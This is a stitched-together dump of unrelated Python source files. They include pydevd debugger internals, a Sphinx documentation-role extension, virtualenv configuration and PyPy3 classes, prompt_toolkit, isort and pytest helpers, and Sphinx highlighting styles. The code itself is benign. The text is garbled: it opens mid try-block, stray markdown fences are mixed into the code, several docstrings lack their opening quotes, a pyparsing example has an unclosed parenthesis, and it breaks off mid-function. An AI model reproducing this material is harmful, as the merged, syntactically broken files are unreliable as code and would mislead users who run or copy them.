        from _pydevd_bundle.pydevd_cython_wrapper import PyDBAdditionalThreadInfo, set_additional_thread_info, _set_additional_thread_info_lock
    except ImportError:
        from _pydevd_bundle.pydevd_additional_thread_info_regular import PyDBAdditionalThreadInfo, set_additional_thread_info, _set_additional_thread_info_lock  # @UnusedImport


import sys
try:
    try:
        from _pydevd_bundle_ext import pydevd_cython as mod

    except ImportError:
        from _pydevd_bundle import pydevd_cython as mod

except ImportError:
    import struct

    try:
        is_python_64bit = (struct.calcsize('P') == 8)
    except:
        # In Jython this call fails, but this is Ok, we don't support Jython for speedups anyways.
        raise ImportError
    plat = '32'
    if is_python_64bit:
        plat = '64'

    # We also accept things as:
    #
    # _pydevd_bundle.pydevd_cython_win32_27_32
    # _pydevd_bundle.pydevd_cython_win32_34_64
    #
    # to have multiple pre-compiled pyds distributed along the IDE
    # (generated by build_tools/build_binaries_windows.py).

    mod_name = 'pydevd_cython_%s_%s%s_%s' % (sys.platform, sys.version_info[0], sys.version_info[1], plat)
    check_name = '_pydevd_bundle.%s' % (mod_name,)
    mod = getattr(__import__(check_name), mod_name)

# Regardless of how it was found, make sure it's later available as the
# initial name so that the expected types from cython in frame eval
# are valid.
sys.modules['_pydevd_bundle.pydevd_cython'] = mod

trace_dispatch = mod.trace_dispatch

PyDBAdditionalThreadInfo = mod.PyDBAdditionalThreadInfo

set_additional_thread_info = mod.set_additional_thread_info

global_cache_skips = mod.global_cache_skips

global_cache_frame_skips = mod.global_cache_frame_skips

_set_additional_thread_info_lock = mod._set_additional_thread_info_lock

fix_top_level_trace_and_get_trace_func = mod.fix_top_level_trace_and_get_trace_func

version = getattr(mod, 'version', 0)

from _pydev_imps._pydev_saved_modules import threading
from _pydevd_bundle.pydevd_utils import notify_about_gevent_if_needed
import weakref
from _pydevd_bundle.pydevd_constants import IS_JYTHON
from _pydev_bundle.pydev_log import exception as pydev_log_exception
import sys
from _pydev_bundle import pydev_log
import pydevd_tracing

if IS_JYTHON:
    import org.python.core as JyCore  # @UnresolvedImport


class PyDBDaemonThread(threading.Thread):

    def __init__(self, py_db, target_and_args=None):
        '''
        :param target_and_args:
            tuple(func, args, kwargs) if this should be a function and args to run.
            -- Note: use through run_as_pydevd_daemon_thread().
        '''
        threading.Thread.__init__(self)
        notify_about_gevent_if_needed()
        self._py_db = weakref.ref(py_db)
        self._kill_received = False
        mark_as_pydevd_daemon_thread(self)
        self._target_and_args = target_and_args

    @property
    def py_db(self):
        return self._py_db()

    def run(self):
        created_pydb_daemon = self.py_db.created_pydb_daemon_threads
        created_pydb_daemon[self] = 1
        try:
            try:
                if IS_JYTHON and not isinstance(threading.currentThread(), threading._MainThread):
                    # we shouldn't update sys.modules for the main thread, cause it leads to the second importing 'threading'
                    # module, and the new instance of main thread is created
                    ss = JyCore.PySystemState()
                    # Note: Py.setSystemState() affects only the current thread.
                    JyCore.Py.setSystemState(ss)

                self._stop_trace()
                self._on_run()
            except:
                if sys is not None and pydev_log_exception is not None:
                    pydev_log_exception()
        finally:
            del created_pydb_daemon[self]

    def _on_run(self):
        if self._target_and_args is not None:
            target, args, kwargs = self._target_and_args
            target(*args, **kwargs)
        else:
            raise NotImplementedError('Should be reimplemented by: %s' % self.__class__)

    def do_kill_pydev_thread(self):
        if not self._kill_received:
            pydev_log.debug('%s received kill signal', self.getName())
            self._kill_received = True

    def _stop_trace(self):
        if self.pydev_do_not_trace:
            pydevd_tracing.SetTrace(None)  # no debugging on this thread


def mark_as_pydevd_daemon_thread(thread):
    thread.pydev_do_not_trace = True
    thread.is_pydev_daemon_thread = True
    thread.daemon = True


def run_as_pydevd_daemon_thread(py_db, func, *args, **kwargs):
    '''
    Runs a function as a pydevd daemon thread (without any tracing in place).
    '''
    t = PyDBDaemonThread(py_db, target_and_args=(func, args, kwargs))
    t.name = '%s (pydevd daemon thread)' % (func.__name__,)
    t.start()
    return t

'''
This module holds the customization settings for the debugger.
'''
from _pydevd_bundle.pydevd_constants import QUOTED_LINE_PROTOCOL


class PydevdCustomization(object):
    DEFAULT_PROTOCOL = QUOTED_LINE_PROTOCOL

def Exec(exp, global_vars, local_vars=None):
    if local_vars is not None:
        exec exp in global_vars, local_vars
    else:
        exec exp in global_vars
def Exec(exp, global_vars, local_vars=None):
    if local_vars is not None:
        exec(exp, global_vars, local_vars)
    else:
        exec(exp, global_vars)
import pkgutil
import sys
from _pydev_bundle import pydev_log
try:
    import pydevd_plugins.extensions as extensions
except:
    pydev_log.exception()
    extensions = None


class ExtensionManager(object):

    def __init__(self):
        self.loaded_extensions = None
        self.type_to_instance = {}

    def _load_modules(self):
        self.loaded_extensions = []
        if extensions:
            for module_loader, name, ispkg in pkgutil.walk_packages(extensions.__path__,
                                                                    extensions.__name__ + '.'):
                mod_name = name.split('.')[-1]
                if not ispkg and mod_name.startswith('pydevd_plugin'):
                    try:
                        __import__(name)
                        module = sys.modules[name]
                        self.loaded_extensions.append(module)
                    except ImportError:
                        pydev_log.critical('Unable to load extension: %s', name)

    def _ensure_loaded(self):
        if self.loaded_extensions is None:
            self._load_modules()

    def _iter_attr(self):
        for extension in self.loaded_extensions:
            dunder_all = getattr(extension, '__all__', None)
            for attr_name in dir(extension):
                if not attr_name.startswith('_'):
                    if dunder_all is None or attr_name in dunder_all:
                        yield attr_name, getattr(extension, attr_name)

    def get_extension_classes(self, extension_type):
        self._ensure_loaded()
        if extension_type in self.type_to_instance:
            return self.type_to_instance[extension_type]
        handlers = self.type_to_instance.setdefault(extension_type, [])
        for attr_name, attr in self._iter_attr():
            if isinstance(attr, type) and issubclass(attr, extension_type) and attr is not extension_type:
                try:
                    handlers.append(attr())
                except:
                    pydev_log.exception('Unable to load extension class: %s', attr_name)
        return handlers


EXTENSION_MANAGER_INSTANCE = ExtensionManager()


def extensions_of_type(extension_type):
    """

    :param T extension_type:  The type of the extension hook
    :rtype: list[T]
    """
    return EXTENSION_MANAGER_INSTANCE.get_extension_classes(extension_type)


def _fix_contents(filename, contents):
    import re

    contents = re.sub(
        r"from bytecode", r'from _pydevd_frame_eval.vendored.bytecode', contents, flags=re.MULTILINE
    )

    contents = re.sub(
        r"import bytecode", r'from _pydevd_frame_eval.vendored import bytecode', contents, flags=re.MULTILINE
    )

    # This test will import the wrong setup (we're not interested in it).
    contents = re.sub(
        r"def test_version\(self\):", r'def skip_test_version(self):', contents, flags=re.MULTILINE
    )

    if filename.startswith('test_'):
        if 'pytestmark' not in contents:
            pytest_mark = '''
import pytest
from tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON
from tests_python.debug_constants import TEST_CYTHON
pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')
'''
            contents = pytest_mark + contents
    return contents


def main():
    import os

    # traverse root directory, and list directories as dirs and files as files
    for root, dirs, files in os.walk(os.path.dirname(__file__)):
        path = root.split(os.sep)
        for filename in files:
            if filename.endswith('.py') and filename != 'pydevd_fix_code.py':
                with open(os.path.join(root, filename), 'r') as stream:
                    contents = stream.read()

                new_contents = _fix_contents(filename, contents)
                if contents != new_contents:
                    print('fixed ', os.path.join(root, filename))
                    with open(os.path.join(root, filename), 'w') as stream:
                        stream.write(new_contents)

#             print(len(path) * '---', filename)


if __name__ == '__main__':
    main()
try:
    try:
        from _pydevd_frame_eval_ext import pydevd_frame_evaluator as mod
    except ImportError:
        from _pydevd_frame_eval import pydevd_frame_evaluator as mod

except ImportError:
    try:
        import sys

        try:
            is_64bits = sys.maxsize > 2 ** 32
        except:
            # In Jython this call fails, but this is Ok, we don't support Jython for speedups anyways.
            raise ImportError
        plat = '32'
        if is_64bits:
            plat = '64'

        # We also accept things as:
        #
        # _pydevd_frame_eval.pydevd_frame_evaluator_win32_27_32
        # _pydevd_frame_eval.pydevd_frame_evaluator_win32_34_64
        #
        # to have multiple pre-compiled pyds distributed along the IDE
        # (generated by build_tools/build_binaries_windows.py).

        mod_name = 'pydevd_frame_evaluator_%s_%s%s_%s' % (sys.platform, sys.version_info[0], sys.version_info[1], plat)
        check_name = '_pydevd_frame_eval.%s' % (mod_name,)
        mod = __import__(check_name)
        mod = getattr(mod, mod_name)
    except ImportError:
        raise

frame_eval_func = mod.frame_eval_func

stop_frame_eval = mod.stop_frame_eval

dummy_trace_dispatch = mod.dummy_trace_dispatch

get_thread_info_py = mod.get_thread_info_py

clear_thread_local_info = mod.clear_thread_local_info

import os

from _pydev_bundle import pydev_log
from _pydevd_bundle.pydevd_trace_dispatch import USING_CYTHON
from _pydevd_bundle.pydevd_constants import USE_CYTHON_FLAG, ENV_FALSE_LOWER_VALUES, \
    ENV_TRUE_LOWER_VALUES, IS_PY36_OR_GREATER, SUPPORT_GEVENT, IS_PYTHON_STACKLESS

frame_eval_func = None
stop_frame_eval = None
dummy_trace_dispatch = None
clear_thread_local_info = None

USING_FRAME_EVAL = False

# "NO" means we should not use frame evaluation, 'YES' we should use it (and fail if not there) and unspecified uses if possible.
use_frame_eval = os.environ.get('PYDEVD_USE_FRAME_EVAL', '').lower()

if use_frame_eval in ENV_FALSE_LOWER_VALUES or USE_CYTHON_FLAG in ENV_FALSE_LOWER_VALUES or not USING_CYTHON:
    pass

elif SUPPORT_GEVENT or IS_PYTHON_STACKLESS:
    pass
    # i.e gevent and frame eval mode don't get along very well.
    # https://github.com/microsoft/debugpy/issues/189
    # Same problem with Stackless.
    # https://github.com/stackless-dev/stackless/issues/240

elif use_frame_eval in ENV_TRUE_LOWER_VALUES:
    # Fail if unable to use
    from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info
    USING_FRAME_EVAL = True

else:
    # Try to use if possible
    if IS_PY36_OR_GREATER:
        try:
            from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info
            USING_FRAME_EVAL = True
        except ImportError:
            pydev_log.show_compile_cython_command_line()

import sys


def find_cached_module(mod_name):
    return sys.modules.get(mod_name, None)

def find_mod_attr(mod_name, attr):
    mod = find_cached_module(mod_name)
    if mod is None:
        return None
    return getattr(mod, attr, None)


def find_class_name(val):
    class_name = str(val.__class__)
    if class_name.find('.') != -1:
        class_name = class_name.split('.')[-1]

    elif class_name.find("'") != -1: #does not have '.' (could be something like <type 'int'>)
        class_name = class_name[class_name.index("'") + 1:]

    if class_name.endswith("'>"):
        class_name = class_name[:-2]

    return class_name


#Note: code gotten from _pydev_imports_tipper.

import sys

def _imp(name, log=None):
    try:
        return __import__(name)
    except:
        if '.' in name:
            sub = name[0:name.rfind('.')]

            if log is not None:
                log.add_content('Unable to import', name, 'trying with', sub)
                log.add_exception()

            return _imp(sub, log)
        else:
            s = 'Unable to import module: %s - sys.path: %s' % (str(name), sys.path)
            if log is not None:
                log.add_content(s)
                log.add_exception()

            raise ImportError(s)


IS_IPY = False
if sys.platform == 'cli':
    IS_IPY = True
    _old_imp = _imp
    def _imp(name, log=None):
        #We must add a reference in clr for .Net
        import clr #@UnresolvedImport
        initial_name = name
        while '.' in name:
            try:
                clr.AddReference(name)
                break #If it worked, that's OK.
            except:
                name = name[0:name.rfind('.')]
        else:
            try:
                clr.AddReference(name)
            except:
                pass #That's OK (not dot net module).

        return _old_imp(initial_name, log)


def import_name(name, log=None):
    mod = _imp(name, log)

    components = name.split('.')

    old_comp = None
    for comp in components[1:]:
        try:
            #this happens in the following case:
            #we have mx.DateTime.mxDateTime.mxDateTime.pyd
            #but after importing it, mx.DateTime.mxDateTime shadows access to mxDateTime.pyd
            mod = getattr(mod, comp)
        except AttributeError:
            if old_comp != comp:
                raise

        old_comp = comp

    return mod


import types

from _pydev_bundle import pydev_log
from _pydevd_bundle import pydevd_trace_api

try:
    from pydevd_plugins import django_debug
except:
    django_debug = None
    pydev_log.debug('Unable to load django_debug plugin')

try:
    from pydevd_plugins import jinja2_debug
except:
    jinja2_debug = None
    pydev_log.debug('Unable to load jinja2_debug plugin')

def load_plugins():
    plugins = []
    if django_debug is not None:
        plugins.append(django_debug)

    if jinja2_debug is not None:
        plugins.append(jinja2_debug)
    return plugins


def bind_func_to_method(func, obj, method_name):
    bound_method = types.MethodType(func, obj)

    setattr(obj, method_name, bound_method)
    return bound_method


class PluginManager(object):

    def __init__(self, main_debugger):
        self.plugins = load_plugins()
        self.active_plugins = []
        self.main_debugger = main_debugger
        self.rebind_methods()

    def add_breakpoint(self, func_name, *args, **kwargs):
        # add breakpoint for plugin and remember which plugin to use in tracing
        for plugin in self.plugins:
            if hasattr(plugin, func_name):
                func = getattr(plugin, func_name)
                result = func(self, *args, **kwargs)
                if result:
                    self.activate(plugin)

                    return result
        return None

    def activate(self, plugin):
        if plugin not in self.active_plugins:
            self.active_plugins.append(plugin)
            self.rebind_methods()

    def rebind_methods(self):
        if len(self.active_plugins) == 0:
            self.bind_functions(pydevd_trace_api, getattr, pydevd_trace_api)
        elif len(self.active_plugins) == 1:
            self.bind_functions(pydevd_trace_api, getattr, self.active_plugins[0])
        else:
            self.bind_functions(pydevd_trace_api, create_dispatch, self.active_plugins)

    def bind_functions(self, interface, function_factory, arg):
        for name in dir(interface):
            func = function_factory(arg, name)
            if type(func) == types.FunctionType:
                bind_func_to_method(func, self, name)


def create_dispatch(obj, name):
    def dispatch(self, *args, **kwargs):
        result = None
        for p in self.active_plugins:
            r = getattr(p, name)(self, *args, **kwargs)
            if not result:
                result = r
        return result
    return dispatch









from _pydevd_bundle.pydevd_extension_api import StrPresentationProvider
from .pydevd_helpers import find_mod_attr, find_class_name


class DjangoFormStr(object):
    def can_provide(self, type_object, type_name):
        form_class = find_mod_attr('django.forms', 'Form')
        return form_class is not None and issubclass(type_object, form_class)

    def get_str(self, val):
        return '%s: %r' % (find_class_name(val), val)

import sys

if not sys.platform.startswith("java"):
    StrPresentationProvider.register(DjangoFormStr)
````

````py
Utility for saving locals.```


```py
import sys

try:
    import types

    frame_type = types.FrameType
except:
    frame_type = type(sys._getframe())


def is_save_locals_available():
    return save_locals_impl is not None


def save_locals(frame):
    """
    Copy values from locals_dict into the fast stack slots in the given frame.

    Note: the 'save_locals' branch had a different approach wrapping the frame (much more code, but it gives ideas
    on how to save things partially, not the 'whole' locals).
    """
    if not isinstance(frame, frame_type):
        # Fix exception when changing Django variable (receiving DjangoTemplateFrame)
        return

    if save_locals_impl is not None:
        try:
            save_locals_impl(frame)
        except:
            pass


def make_save_locals_impl():
    """
    Factory for the 'save_locals_impl' method. This may seem like a complicated pattern but it is essential that the method is created at
    module load time. Inner imports after module load time would cause an occasional debugger deadlock due to the importer lock and debugger
    lock being taken in different order in  different threads.
    """
    try:
        if '__pypy__' in sys.builtin_module_names:
            import __pypy__  # @UnresolvedImport
            save_locals = __pypy__.locals_to_fast
    except:
        pass
    else:
        if '__pypy__' in sys.builtin_module_names:
            def save_locals_pypy_impl(frame):
                save_locals(frame)

            return save_locals_pypy_impl

    try:
        import ctypes
        locals_to_fast = ctypes.pythonapi.PyFrame_LocalsToFast
    except:
        pass
    else:
        def save_locals_ctypes_impl(frame):
            locals_to_fast(ctypes.py_object(frame), ctypes.c_int(0))

        return save_locals_ctypes_impl

    return None


save_locals_impl = make_save_locals_impl()

import os
import traceback
from _pydevd_bundle.pydevd_constants import ForkSafeLock

_pid = os.getpid()
_pid_msg = '%s: ' % (_pid,)

_debug_lock = ForkSafeLock()

DEBUG = False
DEBUG_FILE = os.path.join(os.path.dirname(__file__), '__debug_output__.txt')


def debug(msg):
    if DEBUG:
        with _debug_lock:
            _pid_prefix = _pid_msg
            if isinstance(msg, bytes):
                _pid_prefix = _pid_prefix.encode('utf-8')

                if not msg.endswith(b'\r') and not msg.endswith(b'\n'):
                    msg += b'\n'
                mode = 'a+b'
            else:
                if not msg.endswith('\r') and not msg.endswith('\n'):
                    msg += '\n'
                mode = 'a+'
            with open(DEBUG_FILE, mode) as stream:
                stream.write(_pid_prefix)
                stream.write(msg)


def debug_exception(msg=None):
    if DEBUG:
        if msg:
            debug(msg)

        with _debug_lock:

            with open(DEBUG_FILE, 'a+') as stream:
                _pid_prefix = _pid_msg
                if isinstance(msg, bytes):
                    _pid_prefix = _pid_prefix.encode('utf-8')
                stream.write(_pid_prefix)

                traceback.print_exc(file=stream)

from _pydev_imps._pydev_saved_modules import threading


def wrapper(fun):
    def pydev_after_run_call():
        pass

    def inner(*args, **kwargs):
        fun(*args, **kwargs)
        pydev_after_run_call()
    return inner


def wrap_attr(obj, attr):
    t_save_start = getattr(obj, attr)
    setattr(obj, attr, wrapper(t_save_start))
    obj._pydev_run_patched = True


class ObjectWrapper(object):
    def __init__(self, obj):
        self.wrapped_object = obj
        try:
            import functools
            functools.update_wrapper(self, obj)
        except:
            pass

    def __getattr__(self, attr):
        orig_attr = getattr(self.wrapped_object, attr) #.__getattribute__(attr)
        if callable(orig_attr):
            def patched_attr(*args, **kwargs):
                self.call_begin(attr)
                result = orig_attr(*args, **kwargs)
                self.call_end(attr)
                if result == self.wrapped_object:
                    return self
                return result
            return patched_attr
        else:
            return orig_attr

    def call_begin(self, attr):
        pass

    def call_end(self, attr):
        pass

    def __enter__(self):
        self.call_begin("__enter__")
        self.wrapped_object.__enter__()
        self.call_end("__enter__")

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.call_begin("__exit__")
        self.wrapped_object.__exit__(exc_type, exc_val, exc_tb)


def factory_wrapper(fun):
    def inner(*args, **kwargs):
        obj = fun(*args, **kwargs)
        return ObjectWrapper(obj)
    return inner


def wrap_threads():
    # TODO: add wrappers for thread and _thread
    # import _thread as mod
    # print("Thread imported")
    # mod.start_new_thread = wrapper(mod.start_new_thread)
    import threading
    threading.Lock = factory_wrapper(threading.Lock)
    threading.RLock = factory_wrapper(threading.RLock)

    # queue patching
    try:
        import queue  # @UnresolvedImport
        queue.Queue = factory_wrapper(queue.Queue)
    except:
        import Queue
        Queue.Queue = factory_wrapper(Queue.Queue)


def add_line_breakpoint(plugin, pydb, type, canonical_normalized_filename, line, condition, expression, func_name):
    return None


def add_exception_breakpoint(plugin, pydb, type, exception):
    return False


def remove_exception_breakpoint(plugin, pydb, type, exception):
    return False


def remove_all_exception_breakpoints(plugin, pydb):
    return False


def get_breakpoints(plugin, pydb):
    return None


def can_skip(plugin, pydb, frame):
    return True


def has_exception_breaks(plugin):
    return False


def has_line_breaks(plugin):
    return False


def cmd_step_into(plugin, pydb, frame, event, args, stop_info, stop):
    return False


def cmd_step_over(plugin, pydb, frame, event, args, stop_info, stop):
    return False


def stop(plugin, pydb, frame, event, args, stop_info, arg, step_cmd):
    return False


def get_breakpoint(plugin, pydb, pydb_frame, frame, event, args):
    return None


def suspend(plugin, pydb, thread, frame):
    return None


def exception_break(plugin, pydb, pydb_frame, frame, args, arg):
    return None


def change_variable(plugin, frame, attr, expression):
    return False

import sys

#=======================================================================================================================
# PydevdVmType
#=======================================================================================================================
class PydevdVmType:

    PYTHON = 'python'
    JYTHON = 'jython'
    vm_type = None


#=======================================================================================================================
# set_vm_type
#=======================================================================================================================
def set_vm_type(vm_type):
    PydevdVmType.vm_type = vm_type


#=======================================================================================================================
# get_vm_type
#=======================================================================================================================
def get_vm_type():
    if PydevdVmType.vm_type is None:
        setup_type()
    return PydevdVmType.vm_type


#=======================================================================================================================
# setup_type
#=======================================================================================================================
def setup_type(str=None):
    if str is not None:
        PydevdVmType.vm_type = str
        return

    if sys.platform.startswith("java"):
        PydevdVmType.vm_type = PydevdVmType.JYTHON
    else:
        PydevdVmType.vm_type = PydevdVmType.PYTHON



#

#

#```


```pyExtension to allow references to Python documentation.

Use the ``:pydoc:`` role in-line, specifying the name of the
module to link to.

For example::

    :pydoc:`xml.etree.ElementTree`
````

```py

import sys

from docutils import nodes, utils
from docutils.parsers.rst.roles import set_classes

from sphinx.util import logging

LOG = logging.getLogger(__name__)

PYTHON_VERSION = '{}.{}'.format(*(sys.version_info[:2]))
URL_TEMPLATE = (
    'https://docs.python.org/' +
    PYTHON_VERSION +
    '/library/{}.html'
)
TITLE_TEMPLATE = 'Standard library documentation for {}'


def make_link_node(rawtext, app, module_name, options):
    """Create a link.

    :param rawtext: Text being replaced with link node.
    :param app: Sphinx application context
    :param module_name: The real name of the module
    :param options: Options dictionary passed to role func
    """
    set_classes(options)
    node = nodes.reference(
        rawtext,
        TITLE_TEMPLATE.format(module_name),
        refuri=URL_TEMPLATE.format(module_name.lower()),
        **options)
    return node


def pydoc_role(name, rawtext, text, lineno, inliner,
               options={}, content=[]):
    """Link to a Python module documentation page.

    Returns 2 part tuple containing list of nodes to insert into
    the document and a list of system messages.  Both are allowed
    to be empty.

    :param name: The role name used in the document.
    :param rawtext: The entire markup snippet, with role.
    :param text: The text marked with the role.
    :param lineno: The line number where rawtext appears in the
                   input.
    :param inliner: The inliner instance that called us.
    :param options: Directive options for customization.
    :param content: The directive content for customization.
    """
    module_name = text.strip()
    if not module_name:
        msg = inliner.reporter.error(
            'Module name must not be empty; '
            '%r is invalid.' % text, line=lineno)
        prb = inliner.problematic(rawtext, rawtext, msg)
        return [prb], [msg]
    app = inliner.document.settings.env.app
    # LOG.info('stdlib module link {!r}\n'.format(text))
    node = make_link_node(rawtext, app, module_name, options)
    return [node], []


def setup(app):
    """Install the plugin.

    :param app: Sphinx application context.
    """
    LOG.info('Initializing BitBucket plugin')
    app.add_role('pydoc', pydoc_role)

from __future__ import absolute_import, unicode_literals

import logging
from collections import OrderedDict

from virtualenv.util.six import ensure_text


class PyEnvCfg(object):
    def __init__(self, content, path):
        self.content = content
        self.path = path

    @classmethod
    def from_folder(cls, folder):
        return cls.from_file(folder / "pyvenv.cfg")

    @classmethod
    def from_file(cls, path):
        content = cls._read_values(path) if path.exists() else OrderedDict()
        return PyEnvCfg(content, path)

    @staticmethod
    def _read_values(path):
        content = OrderedDict()
        for line in path.read_text(encoding="utf-8").splitlines():
            equals_at = line.index("=")
            key = line[:equals_at].strip()
            value = line[equals_at + 1 :].strip()
            content[key] = value
        return content

    def write(self):
        logging.debug("write %s", ensure_text(str(self.path)))
        text = ""
        for key, value in self.content.items():
            line = "{} = {}".format(key, value)
            logging.debug("\t%s", line)
            text += line
            text += "\n"
        self.path.write_text(text, encoding="utf-8")

    def refresh(self):
        self.content = self._read_values(self.path)
        return self.content

    def __setitem__(self, key, value):
        self.content[key] = value

    def __getitem__(self, key):
        return self.content[key]

    def __contains__(self, item):
        return item in self.content

    def update(self, other):
        self.content.update(other)
        return self

    def __repr__(self):
        return "{}(path={})".format(self.__class__.__name__, self.path)
```

````py
Implementation of the command-line I{pyflakes} tool.```


```py
from __future__ import absolute_import

# For backward compatibility
__all__ = ['check', 'checkPath', 'checkRecursive', 'iterSourceCode', 'main']
from pyflakes.api import check, checkPath, checkRecursive, iterSourceCode, main

from typing import TYPE_CHECKING, List, Tuple

from prompt_toolkit.styles.pygments import pygments_token_to_classname

from .base import StyleAndTextTuples

if TYPE_CHECKING:
    from pygments.token import Token

__all__ = [
    "PygmentsTokens",
]


class PygmentsTokens:
    """
    Turn a pygments token list into a list of prompt_toolkit text fragments
    (``(style_str, text)`` tuples).
    """

    def __init__(self, token_list: List[Tuple["Token", str]]) -> None:
        self.token_list = token_list

    def __pt_formatted_text__(self) -> StyleAndTextTuples:
        result: StyleAndTextTuples = []

        for token, text in self.token_list:
            result.append(("class:" + pygments_token_to_classname(token), text))

        return result
````

````py
    sphinx.pygments_styles
    ~~~~~~~~~~~~~~~~~~~~~~

    Sphinx theme specific highlighting styles.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.styles.friendly import FriendlyStyle
from pygments.token import (Comment, Error, Generic, Keyword, Name, Number, Operator, String,
                            Whitespace)


class NoneStyle(Style):
    """Style without any styling."""


class SphinxStyle(Style):
    """
    Like friendly, but a bit darker to enhance contrast on the green
    background.
    """

    background_color = '#eeffcc'
    default_style = ''

    styles = FriendlyStyle.styles
    styles.update({
        Generic.Output: '#333',
        Comment: 'italic #408090',
        Number: '#208050',
    })


class PyramidStyle(Style):
    """
    Pylons/pyramid pygments style based on friendly style, by Blaise Laflamme.
    """

    # work in progress...

    background_color = "#f8f8f8"
    default_style = ""

    styles = {
        Whitespace:                "#bbbbbb",
        Comment:                   "italic #60a0b0",
        Comment.Preproc:           "noitalic #007020",
        Comment.Special:           "noitalic bg:#fff0f0",

        Keyword:                   "bold #007020",
        Keyword.Pseudo:            "nobold",
        Keyword.Type:              "nobold #902000",

        Operator:                  "#666666",
        Operator.Word:             "bold #007020",

        Name.Builtin:              "#007020",
        Name.Function:             "#06287e",
        Name.Class:                "bold #0e84b5",
        Name.Namespace:            "bold #0e84b5",
        Name.Exception:            "#007020",
        Name.Variable:             "#bb60d5",
        Name.Constant:             "#60add5",
        Name.Label:                "bold #002070",
        Name.Entity:               "bold #d55537",
        Name.Attribute:            "#0e84b5",
        Name.Tag:                  "bold #062873",
        Name.Decorator:            "bold #555555",

        String:                    "#4070a0",
        String.Doc:                "italic",
        String.Interpol:           "italic #70a0d0",
        String.Escape:             "bold #4070a0",
        String.Regex:              "#235388",
        String.Symbol:             "#517918",
        String.Other:              "#c65d09",
        Number:                    "#40a070",

        Generic.Heading:           "bold #000080",
        Generic.Subheading:        "bold #800080",
        Generic.Deleted:           "#A00000",
        Generic.Inserted:          "#00A000",
        Generic.Error:             "#FF0000",
        Generic.Emph:              "italic",
        Generic.Strong:            "bold",
        Generic.Prompt:            "bold #c65d09",
        Generic.Output:            "#888",
        Generic.Traceback:         "#04D",

        Error:                     "#a40000 bg:#fbe3e4"
    }

import os
import sys
from contextlib import contextmanager
from typing import Any, Dict, List

from pylama.lint import Linter as BaseLinter

from isort.exceptions import FileSkipped

from . import api


@contextmanager
def supress_stdout():
    stdout = sys.stdout
    with open(os.devnull, "w") as devnull:
        sys.stdout = devnull
        yield
        sys.stdout = stdout


class Linter(BaseLinter):
    def allow(self, path: str) -> bool:
        """Determine if this path should be linted."""
        return path.endswith(".py")

    def run(self, path: str, **meta: Any) -> List[Dict[str, Any]]:
        """Lint the file. Return an array of error dicts if appropriate."""
        with supress_stdout():
            try:
                if not api.check_file(path, disregard_skip=False):
                    return [
                        {
                            "lnum": 0,
                            "col": 0,
                            "text": "Incorrectly sorted imports.",
                            "type": "ISORT",
                        }
                    ]
            except FileSkipped:
                pass

            return []

import pyparsing as pp
single_value = pp.QuotedString(quoteChar="'", endQuoteChar="'")
parser = pp.nestedExpr(opener="[", closer="]",
                       content=single_value,
                       ignoreExpr=None)

example = "['title|You are looking at article' ['@articlenumber'] ['@articlename']]"
print(parser.parseString(example, parseAll=True))

text = '{They {mean to {win}} Wimbledon}'
print(pp.nestedExpr(opener='{', closer='}').parseString(text)

from typing import Optional

import pyperclip

from prompt_toolkit.selection import SelectionType

from .base import Clipboard, ClipboardData

__all__ = [
    "PyperclipClipboard",
]


class PyperclipClipboard(Clipboard):
    """
    Clipboard that synchronizes with the Windows/Mac/Linux system clipboard,
    using the pyperclip module.
    """

    def __init__(self) -> None:
        self._data: Optional[ClipboardData] = None

    def set_data(self, data: ClipboardData) -> None:
        self._data = data
        pyperclip.copy(data.text)

    def get_data(self) -> ClipboardData:
        text = pyperclip.paste()

        # When the clipboard data is equal to what we copied last time, reuse
        # the `ClipboardData` instance. That way we're sure to keep the same
        # `SelectionType`.
        if self._data and self._data.text == text:
            return self._data

        # Pyperclip returned something else. Create a new `ClipboardData`
        # instance.
        else:
            return ClipboardData(
                text=text,
                type=SelectionType.LINES if "\n" in text else SelectionType.CHARACTERS,
            )

from __future__ import absolute_import, unicode_literals

import abc

from six import add_metaclass

from virtualenv.create.describe import PosixSupports, Python3Supports, WindowsSupports
from virtualenv.create.via_global_ref.builtin.ref import PathRefToDest
from virtualenv.util.path import Path

from .common import PyPy


@add_metaclass(abc.ABCMeta)
class PyPy3(PyPy, Python3Supports):
    @classmethod
    def exe_stem(cls):
        return "pypy3"

    @classmethod
    def exe_names(cls, interpreter):
        return super(PyPy3, cls).exe_names(interpreter) | {"pypy"}


class PyPy3Posix(PyPy3, PosixSupports):
    """PyPy 2 on POSIX"""

    @property
    def stdlib(self):
        """PyPy3 respects sysconfig only for the host python, virtual envs is instead lib/pythonx.y/site-packages"""
        return self.dest / "lib" / "python{}".format(self.interpreter.version_release_str) / "site-packages"

    @classmethod
    def _shared_libs(cls):
        return ["libpypy3-c.so", "libpypy3-c.dylib"]

    def to_lib(self, src):
        return self.dest / "lib" / src.name

    @classmethod
    def sources(cls, interpreter):
        for src in super(PyPy3Posix, cls).sources(interpreter):
            yield src
        host_lib = Path(interpreter.system_prefix) / "lib"
        if host_lib.exists() and host_lib.is_dir():
            for path in host_lib.iterdir():
                yield PathRefToDest(path, dest=cls.to_lib)


class Pypy3Windows(PyPy3, WindowsSupports):
    """PyPy 2 on Windows"""

    @property
    def stdlib(self):
        """PyPy3 respects sysconfig only for the host python, virtual envs is instead Lib/site-packages"""
        return self.dest / "Lib" / "site-packages"

    @property
    def bin_dir(self):
        """PyPy3 needs to fallback to pypy definition"""
        return self.dest / "Scripts"

    @classmethod
    def _shared_libs(cls):
        return ["libpypy3-c.dll", "libffi-7.dll"]
````

```pyHelper plugin for pytester; should not be loaded on its own."""
# This plugin contains assertions used by pytester. pytester cannot
# contain them itself, since it is imported by the `pytest` module,
# hence cannot be subject to assertion rewriting, which requires a
# module to not be already imported.
from typing import Dict
from typing import Sequence
from typing import Tuple
from typing import Union

from _pytest.reports import CollectReport
from _pytest.reports import TestReport


def assertoutcome(
    outcomes: Tuple[
        Sequence[TestReport],
        Sequence[Union[CollectReport, TestReport]],
